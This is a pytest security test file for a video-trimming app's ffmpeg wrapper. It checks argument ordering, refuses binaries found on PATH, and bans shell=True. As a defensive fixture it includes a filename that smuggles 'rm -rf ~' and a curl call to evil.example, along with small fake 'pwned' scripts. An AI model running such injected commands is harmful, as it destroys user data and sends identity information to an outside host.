"""P0: the app runs only binaries it shipped, and never lets media reach a shell.

The protocol whitelist tests assert on the *argument list by index*, not on the
string being present somewhere. A whitelist placed after the ``-i`` it is meant
to apply to parses cleanly and does nothing, which is exactly the failure a
substring check would wave through.
"""

import os
import stat
import subprocess
import sys
from pathlib import Path

import pytest

from videotrim import ffmpeg_tools
from videotrim.ffmpeg_tools import PROTOCOL_WHITELIST, FFmpegError, UntrustedExecutable


BUILDERS = ["clip_command", "frame_command", "proxy_command"]


def _build(name, ffmpeg, source, target):
    if name == "clip_command":
        return ffmpeg_tools.clip_command(ffmpeg, source, target, 1000, 5000)
    if name == "frame_command":
        return ffmpeg_tools.frame_command(ffmpeg, source, target, 1000)
    return ffmpeg_tools.proxy_command(ffmpeg, source, target, 720)


@pytest.mark.parametrize("builder", BUILDERS)
def test_whitelist_precedes_the_input_it_applies_to(builder, tmp_path):
    command = _build(builder, "ffmpeg", tmp_path / "in.mp4", tmp_path / "out.mp4")

    assert PROTOCOL_WHITELIST[0] in command, f"{builder} has no protocol whitelist"
    flag_at = command.index(PROTOCOL_WHITELIST[0])
    assert command[flag_at + 1] == PROTOCOL_WHITELIST[1]

    input_at = command.index("-i")
    assert flag_at < input_at, (
        f"{builder} places -protocol_whitelist after -i, where it silently does nothing"
    )


@pytest.mark.parametrize("builder", BUILDERS)
def test_no_overwrite_flag_and_stdin_stays_closed(builder, tmp_path):
    command = _build(builder, "ffmpeg", tmp_path / "in.mp4", tmp_path / "out.mp4")
    assert "-y" not in command, f"{builder} still passes -y"
    assert "-n" in command
    assert "-nostdin" in command


def test_probe_commands_carry_the_whitelist_before_the_input(tmp_path):
    """The probe is the first thing that touches attacker-supplied bytes."""
    for command in (
        ffmpeg_tools.probe_command("ffprobe", tmp_path / "upload.mp4"),
        ffmpeg_tools.ffmpeg_probe_command("ffmpeg", tmp_path / "upload.mp4"),
    ):
        flag_at = command.index(PROTOCOL_WHITELIST[0])
        assert command[flag_at + 1] == PROTOCOL_WHITELIST[1]
        assert flag_at < command.index("-i")


def test_path_is_never_searched_for_ffmpeg(tmp_path, monkeypatch):
    """A malicious ffmpeg earlier on PATH must not be found, let alone run."""
    fake_dir = tmp_path / "evil"
    fake_dir.mkdir()
    fake = fake_dir / ("ffmpeg.exe" if sys.platform == "win32" else "ffmpeg")
    fake.write_text("#!/bin/sh\ntouch /tmp/pwned\n", encoding="utf-8")
    fake.chmod(fake.stat().st_mode | stat.S_IEXEC)

    monkeypatch.setenv("PATH", str(fake_dir))
    # Nothing shipped inside the install root, and imageio absent.
    monkeypatch.setitem(sys.modules, "imageio_ffmpeg", None)

    found = ffmpeg_tools.find_ffmpeg()
    assert found is None or str(fake_dir) not in str(found), (
        "an ffmpeg from PATH was selected"
    )


def test_shutil_which_is_not_imported_at_all():
    """The PATH fallback is gone, not merely unreached."""
    source = Path(ffmpeg_tools.__file__).read_text(encoding="utf-8")
    assert "shutil.which" not in source
    assert "import shutil" not in source


def test_executable_outside_the_install_root_is_refused(tmp_path):
    outsider = tmp_path / "ffmpeg"
    outsider.write_text("#!/bin/sh\n", encoding="utf-8")
    with pytest.raises(UntrustedExecutable):
        ffmpeg_tools.verify_executable(outsider)


def test_missing_executable_is_refused():
    with pytest.raises(FFmpegError):
        ffmpeg_tools.verify_executable("")


def test_run_with_progress_verifies_containment_before_popen(tmp_path, monkeypatch):
    """Containment is re-checked at the last moment, not trusted from discovery."""
    started = []
    monkeypatch.setattr(subprocess, "Popen",
                        lambda *args, **kwargs: started.append(args) or None)
    with pytest.raises(UntrustedExecutable):
        ffmpeg_tools.run_with_progress([str(tmp_path / "ffmpeg"), "-i", "x"], 1000)
    assert not started, "a child process was started before containment was proven"


def test_extract_frame_refuses_an_external_target(tmp_path):
    with pytest.raises(FFmpegError):
        ffmpeg_tools.extract_frame("ffmpeg", tmp_path / "in.mp4",
                                   tmp_path / "outside.png", 0)


def test_filenames_with_shell_metacharacters_stay_inert(tmp_path):
    """A name is data. It is one element of a list, never part of a command line."""
    nasty = tmp_path / "clip; rm -rf ~ && curl evil.example $(whoami).mp4"
    command = ffmpeg_tools.clip_command("ffmpeg", nasty, tmp_path / "out.mp4", 0, 1000)
    assert str(nasty) in command, "the source should appear as one whole argument"
    assert all(isinstance(part, str) for part in command)
    # No element is a concatenation that a shell could re-split meaningfully.
    assert command.count(str(nasty)) == 1


def test_no_shell_true_anywhere_in_the_shipped_code():
    """Belt and braces alongside the CI gate, which also fails on shell=True.

    Scanned over the shipping code only. The tests themselves talk *about*
    shell=True, and scanning them would make this assert on its own prose.
    """
    root = Path(ffmpeg_tools.__file__).resolve().parents[1]
    skip = {"tests", "venv", ".venv", "__pycache__", "security"}
    for path in root.rglob("*.py"):
        if any(part in skip for part in path.relative_to(root).parts):
            continue
        text = path.read_text(encoding="utf-8")
        assert "shell=True" not in text, f"{path} uses shell=True"
        assert "os.system(" not in text, f"{path} uses os.system"


def test_media_is_never_executed(tmp_path):
    """A browsed or uploaded file is only ever an -i argument."""
    script = tmp_path / "payload.sh"
    script.write_text("#!/bin/sh\necho pwned\n", encoding="utf-8")
    if os.name == "posix":
        script.chmod(0o755)
    command = ffmpeg_tools.clip_command("ffmpeg", script, tmp_path / "out.mp4", 0, 1000)
    assert command[0] == "ffmpeg"
    assert command[command.index("-i") + 1] == str(script)
